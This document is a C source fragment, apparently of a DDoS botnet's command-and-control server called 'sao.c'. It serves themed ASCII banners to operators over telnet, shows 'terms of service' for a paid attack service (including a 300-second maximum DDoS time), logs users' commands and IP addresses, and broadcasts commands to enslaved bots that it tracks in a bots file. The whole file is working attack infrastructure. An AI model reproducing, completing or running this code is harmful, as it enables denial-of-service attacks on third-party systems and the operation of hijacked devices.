        char asuna_banner5  [5000];
        char asuna_banner6  [5000];
        char asuna_banner7  [5000];
        char asuna_banner8  [5000];
        char asuna_banner9  [5000];
		char asuna_banner10  [5000];
		char asuna_banner11  [5000];

        sprintf(asuna_banner1, "\x1b[1;37m      ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄ \r\n");
        sprintf(asuna_banner2, "\x1b[1;37m     ▐\x1b[0;31m░░░░░░░░░░░\x1b[1;37m▌▐\x1b[0;31m░░░░░░░░░░░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌       ▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░░\x1b[1;37m▌      ▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░░░░░░░░░░░\x1b[1;37m▌\r\n");
        sprintf(asuna_banner3, "\x1b[1;37m     ▐\x1b[0;31m░\x1b[1;37m█▀▀▀▀▀▀▀█\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m█▀▀▀▀▀▀▀▀▀ ▐\x1b[0;31m░\x1b[1;37m▌       ▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌\x1b[0;31m░\x1b[1;37m▌     ▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m█▀▀▀▀▀▀▀█\x1b[0;31m░\x1b[1;37m▌\r\n");
        sprintf(asuna_banner4, "\x1b[1;37m     ▐\x1b[0;31m░\x1b[1;37m▌       ▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌          ▐\x1b[0;31m░\x1b[1;37m▌       ▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌    ▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌       ▐\x1b[0;31m░\x1b[1;37m▌\r\n");
        sprintf(asuna_banner5, "\x1b[1;37m     ▐\x1b[0;31m░\x1b[1;37m█▄▄▄▄▄▄▄█\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m█▄▄▄▄▄▄▄▄▄ ▐\x1b[0;31m░\x1b[1;37m▌       ▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌ ▐\x1b[0;31m░\x1b[1;37m▌   ▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m█▄▄▄▄▄▄▄█\x1b[0;31m░\x1b[1;37m▌\r\n");
        sprintf(asuna_banner6, "\x1b[1;37m     ▐\x1b[0;31m░░░░░░░░░░░\x1b[1;37m▌▐\x1b[0;31m░░░░░░░░░░░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌       ▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌  ▐\x1b[0;31m░\x1b[1;37m▌  ▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░░░░░░░░░░░\x1b[1;37m▌\r\n");
        sprintf(asuna_banner7, "\x1b[1;37m     ▐\x1b[0;31m░\x1b[1;37m█▀▀▀▀▀▀▀█\x1b[0;31m░\x1b[1;37m▌ ▀▀▀▀▀▀▀▀▀█\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌       ▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌   ▐\x1b[0;31m░\x1b[1;37m▌ ▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m█▀▀▀▀▀▀▀█\x1b[0;31m░\x1b[1;37m▌\r\n");
        sprintf(asuna_banner8, "\x1b[1;37m     ▐\x1b[0;31m░\x1b[1;37m▌       ▐\x1b[0;31m░\x1b[1;37m▌          ▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌       ▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌    ▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌       ▐\x1b[0;31m░\x1b[1;37m▌\r\n");
        sprintf(asuna_banner9, "\x1b[1;37m     ▐\x1b[0;31m░\x1b[1;37m▌       ▐\x1b[0;31m░\x1b[1;37m▌ ▄▄▄▄▄▄▄▄▄█\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m█▄▄▄▄▄▄▄█\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌     ▐\x1b[0;31m░\x1b[1;37m▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌       ▐\x1b[0;31m░\x1b[1;37m▌\r\n");
		sprintf(asuna_banner10, "\x1b[1;37m     ▐\x1b[0;31m░\x1b[1;37m▌       ▐\x1b[0;31m░\x1b[1;37m▌▐\x1b[0;31m░░░░░░░░░░░\x1b[1;37m▌▐\x1b[0;31m░░░░░░░░░░░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌      ▐\x1b[0;31m░░\x1b[1;37m▌▐\x1b[0;31m░\x1b[1;37m▌       ▐\x1b[0;31m░\x1b[1;37m▌\r\n");
		sprintf(asuna_banner11, "\x1b[1;37m      ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀        ▀▀  ▀         ▀ \r\n");
		
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, asuna_banner1, strlen(asuna_banner1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, asuna_banner2, strlen(asuna_banner2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, asuna_banner3, strlen(asuna_banner3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, asuna_banner4, strlen(asuna_banner4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, asuna_banner5, strlen(asuna_banner5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, asuna_banner6, strlen(asuna_banner6), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, asuna_banner7, strlen(asuna_banner7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, asuna_banner8, strlen(asuna_banner8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, asuna_banner9, strlen(asuna_banner9), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, asuna_banner10, strlen(asuna_banner10), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, asuna_banner11, strlen(asuna_banner11), MSG_NOSIGNAL) == -1) goto end;
        while(1) {
        if(send(thefd, "\x1b[1;33mSAO~$ \x1b[1;32m", 13, MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
        continue;
        }

        if(strstr(buf, "kirito")){
        char extend_banner_line1 [5000];
        char extend_banner_line2 [5000];
        char extend_banner_line3 [5000];
        char extend_banner_line4 [5000];
        char extend_banner_line5 [5000];
        char extend_banner_line6 [5000];
		char extend_banner_line7 [5000];

		sprintf(extend_banner_line1, "\x1b[0;37m \r\n");
        sprintf(extend_banner_line2, "\x1b[0;37m  ██╗  ██╗██╗██████╗ ██╗████████╗ ██████╗ \r\n");
        sprintf(extend_banner_line3, "\x1b[0;37m  ██║ ██╔╝██║██╔══██╗██║╚══██╔══╝██╔═══██╗\r\n");
        sprintf(extend_banner_line4, "\x1b[0;37m  █████╔╝ ██║██████╔╝██║   ██║   ██║   ██║\r\n");
        sprintf(extend_banner_line5, "\x1b[0;37m  ██╔═██╗ ██║██╔══██╗██║   ██║   ██║   ██║\r\n");
        sprintf(extend_banner_line6, "\x1b[0;37m  ██║  ██╗██║██║  ██║██║   ██║   ╚██████╔╝\r\n");
        sprintf(extend_banner_line7, "\x1b[0;37m  ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝ \r\n");

        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extend_banner_line1, strlen(extend_banner_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extend_banner_line2, strlen(extend_banner_line2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extend_banner_line3, strlen(extend_banner_line3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extend_banner_line4, strlen(extend_banner_line4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extend_banner_line5, strlen(extend_banner_line5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extend_banner_line6, strlen(extend_banner_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, extend_banner_line7, strlen(extend_banner_line7), MSG_NOSIGNAL) == -1) goto end;
        while(1) {
        if(send(thefd, "\x1b[1;33mSAO~$ \x1b[1;32m", 13, MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
        continue;
                }

                        if(strstr(buf, "TOS")){

        char Tline1 [80];
        char Tline2 [80];
        char Tline3 [80];
        char Tline4 [80];
        char Tline5 [80];
        char Tline6 [80];
    
        sprintf(Tline1, "\x1b[35m Dont Hit Gov Sites 4 The Dumb Asses\r\n");
        sprintf(Tline2, "\x1b[35m You can't give your login out\r\n");
        sprintf(Tline3, "\x1b[35m You can't give out server info\r\n");
        sprintf(Tline4, "\x1b[35m Dont Spam Attacks Fucktard\r\n");
        sprintf(Tline5, "\x1b[35m 300 Seconds MAX DDoS Time\r\n");
        sprintf(Tline6, "\x1b[35m NO REFUNDS FOR MORONS WHO GET KICKED\r\n");
        
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tline1, strlen(Tline1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tline2, strlen(Tline2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tline3, strlen(Tline3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tline4, strlen(Tline4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tline5, strlen(Tline5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tline6, strlen(Tline6), MSG_NOSIGNAL) == -1) goto end;
        while(1) {
        if(send(thefd, "\x1b[1;33mSAO~$ \x1b[1;32m", 13, MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
        continue;
        }
        
        
        if(strstr(buf, "GB")) 
        {  
          sprintf(botnet, "Thanks for buying %s see you next time\r\n", accounts[find_line].id, buf);
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
          goto end;
        }
                trim(buf);
                if(send(thefd, "\x1b[1;33mSAO~$ \x1b[1;32m", 11, MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].id, buf);
                FILE *logFile;
                logFile = fopen("report.log", "a");
                fprintf(logFile, "%s: \"%s\"\n",accounts[find_line].id, buf);
                fclose(logFile);
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
        }
        end:    
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
 
        {       printf("IP logged: ");
                client_addr(cli_addr);
                FILE *logFile;
                logFile = fopen("ip.log", "a");
                fprintf(logFile, "%d.%d.%d.%d", cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
                fclose(logFile);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
        pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);       }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); 
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
                fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        printf("\x1b[31mTHIS SHIT PRIVATE,\x1b[34m DO NOT FUCKING LEAK, \x1b[32msao.c \x1b[35mP2P \x1b[36mSCREENED\x1b[0m\n");
        telFD = fopen("bots.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]); 
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD); 
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN); 
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
        epollFD = epoll_create1 (0); 
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 2], NULL, &epollEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
                broadcast("PING", -1, "PUV");
                sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
